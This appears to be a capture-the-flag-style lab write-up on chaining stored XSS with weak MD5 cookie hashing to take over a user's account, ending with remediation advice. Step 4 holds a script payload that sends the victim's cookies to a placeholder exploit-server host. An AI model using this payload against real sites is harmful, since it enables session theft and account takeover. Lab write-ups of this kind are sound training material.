# Lab Documentation: Offline Password Cracking

## Lab

**Name:** Offline Password Cracking
**Difficulty:** Practitioner

## Objective

Obtain Carlos's **stay-logged-in** cookie using a stored XSS vulnerability, crack the password hash stored inside the cookie, log in as Carlos, and delete his account.

## Steps Performed

### 1. Analyze the Stay Logged In Cookie

* Logged in using the provided credentials:

  * **Username:** wiener
  * **Password:** peter
* Enabled the **Stay logged in** option.
* Observed that the `stay-logged-in` cookie was **Base64 encoded**.
* Decoded the cookie using Burp Suite Decoder.

### 2. Understand the Cookie Format

After decoding, the cookie was found to have the following format:

```
username:md5(password)
```

Example:

```
wiener:md5hash
```

### 3. Identify the XSS Vulnerability

* Tested the blog comment section.
* Confirmed that it was vulnerable to **Stored Cross-Site Scripting (XSS)**.

### 4. Steal the Victim's Cookie

Posted the following payload in a blog comment:

```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

When Carlos viewed the comment, his browser sent his cookies to the exploit server.

### 5. Decode the Stolen Cookie

Retrieved the cookie from the exploit server access log and decoded it.

Result:

```
carlos:26323c16d5f4dabff3bb136f2460a943
```

### 6. Crack the Password Hash

The MD5 hash was identified as:

```
onceuponatime
```

### 7. Log In as Carlos

Credentials:

* **Username:** carlos
* **Password:** onceuponatime

Successfully accessed Carlos's account.

### 8. Delete the Account

Navigated to **My Account** and selected **Delete Account**, completing the lab.

---

# Key Findings

* Password hashes were stored inside client-side cookies.
* The hash used was **MD5**, which is weak and easily cracked.
* A **Stored XSS** vulnerability allowed theft of authentication cookies.
* Combining XSS with weak password storage resulted in complete account compromise.

# Vulnerabilities

* Stored Cross-Site Scripting (Stored XSS)
* Weak password hashing (MD5)
* Sensitive authentication data stored in client-side cookies

# Impact

An attacker can:

* Steal authentication cookies.
* Recover weakly hashed passwords offline.
* Take over user accounts.
* Perform actions as the victim, including deleting the account.

# Remediation

* Replace MD5 with a strong password hashing algorithm such as Argon2, bcrypt, or scrypt.
* Never store password hashes in client-side cookies.
* Sanitize and encode user input to prevent XSS.
* Set cookies with the **HttpOnly**, **Secure**, and **SameSite** attributes.
